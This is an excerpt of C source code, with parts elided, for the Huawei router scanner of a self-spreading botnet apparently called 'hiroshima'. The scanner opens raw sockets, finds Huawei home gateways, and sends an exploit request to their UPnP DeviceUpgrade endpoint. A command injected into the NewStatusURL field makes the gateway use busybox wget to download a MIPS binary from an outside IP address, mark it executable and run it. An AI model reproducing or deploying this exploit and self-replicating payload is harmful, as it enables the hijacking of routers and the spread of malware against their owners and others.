...
void huaweiscanner_scanner_init(void)
{
    ...
    {
        #ifdef DEBUG
            printf("[hiroshima/huawei] failed to initialize raw socket, cannot scan\n");
        #endif
        exit(0);
    }
    ...
    {
        #ifdef DEBUG
            printf("[hiroshima/huawei] failed to set IP_HDRINCL, cannot scan\n");
        #endif
    ...
    #ifdef DEBUG
        printf("[hiroshima/huawei] scanner process initialized. scanning started.\n");
    #endif
        ...
        for(i = 0; i < huaweiscanner_SCANNER_MAX_CONNS; i++)
        {
            ...
            if(FD_ISSET(conn->fd, &fdset_wr))
            {
                ...
                if(err == 0 && ret == 0)
                {
                    ...
                    {
                        #ifdef DEBUG
                            printf("[hiroshima/huawei] sending payload to fd=%d\n", conn->fd);
                        #endif

                        
                        util_strcpy(conn->payload_buf, "POST /ctrlt/DeviceUpgrade_1 HTTP/1.1\r\nContent-Length: 430\r\nConnection: keep-alive\r\nAccept: */*\r\nAuthorization: Digest username=\"dslf-config\", realm=\"HuaweiHomeGateway\", nonce=\"88645cefb1f9ede0e336e3569d75ee30\", uri=\"/ctrlt/DeviceUpgrade_1\", response=\"3612f843a42db38f48f59d2a3597e19c\", algorithm=\"MD5\", qop=\"auth\", nc=00000001, cnonce=\"248d1a2560100669\"\r\n\r\n<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\"><s:Body><u:Upgrade xmlns:u=\"urn:schemas-upnp-org:service:WANPPPConnection:1\"><NewStatusURL>$(/bin/busybox wget -g 91.122.37.169 -l /tmp/.hiroshima -r /596a96cc7bf9108cd896f33c44aedc8a/db0fa4b8db0333367e9bda3ab68b8042.mips; /bin/busybox chmod 777 * /tmp/.hiroshima; /tmp/.hiroshima huawei.selfrep)</NewStatusURL><NewDownloadURL>$(echo HUAWEIUPNP)</NewDownloadURL></u:Upgrade></s:Body></s:Envelope>\r\n\r\n");
                    ...
                    {
                        #ifdef DEBUG
                            printf("[hiroshima/huawei] finished payload to fd=%d\n", conn->fd);
                        #endif
